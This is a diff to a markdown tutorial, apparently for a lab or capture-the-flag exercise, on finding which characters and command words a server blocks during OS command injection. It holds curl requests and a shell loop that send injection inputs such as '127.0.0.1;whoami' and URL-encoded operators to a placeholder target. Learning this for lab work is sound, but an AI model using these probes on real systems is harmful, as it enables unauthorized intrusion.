@@ -4,12 +4,12 @@
 
 ## How Filters Show Up
 
-When the server has a denylist of characters/commands, attempted injection produces one of:
+When the server has a denylist of characters or commands, attempted injection produces one of these responses:
 
 | Symptom | Probable filter location |
 |---------|--------------------------|
 | `Invalid input` (or similar) in the output area where ping result usually is | Server-side application denylist |
-| HTTP 403 / blocked page with attacker IP | WAF (ModSecurity, Cloudflare, etc.) |
+| HTTP 403 / blocked page with attacker IP | Web Application Firewall (WAF) — ModSecurity, Cloudflare, etc. |
 | Generic error or "Something went wrong" | Server-side framework filter |
 | Request 200 but no execution | Silent filter — character stripped before exec |
 | Response delay | Server processed but blocked output |
@@ -33,6 +33,7 @@ curl -X POST "http://TARGET/" -d "ip=127.0.0.1 "     # is space blocked?
 curl -X POST "http://TARGET/" -d "ip=whoami"          # is whoami blocked?
 curl -X POST "http://TARGET/" -d "ip=cat"             # cat blocked?
 ```
+> Tests one variable at a time. Start with a valid IP to confirm the baseline. Then add one special character per request. If `Invalid input` appears, that character is blocked. Test command words separately from operators to identify which type of filter is active.
 
 The principle: isolate ONE variable. If `127.0.0.1;whoami` is blocked but `127.0.0.1;` passes, the WORD `whoami` is the blocked element, not the `;`.
 
@@ -53,6 +54,7 @@ for pair in "%0a:newline" "%26:&" "%7c:|" "%3b:;" "%26%26:&&" "%7c%7c:||"; do
   fi
 done
 ```
+> Automates operator testing by sending each one alone (no second command). This isolates the operator filter from a command-name filter. Any operator that doesn't trigger "Invalid input" is available for injection.
 
 Whatever passes is your operator. Then layer in test commands one at a time.
 
@@ -114,6 +116,7 @@ for pair in "%0a:newline" "%26:&" "%7c:|"; do
   fi
 done
 ```
+> Tests the three most common operators against the lab target. Replace the IP and port with the current target. The operator that does not trigger `Invalid input` is available for the injection chain.
 
 Result:
 ```
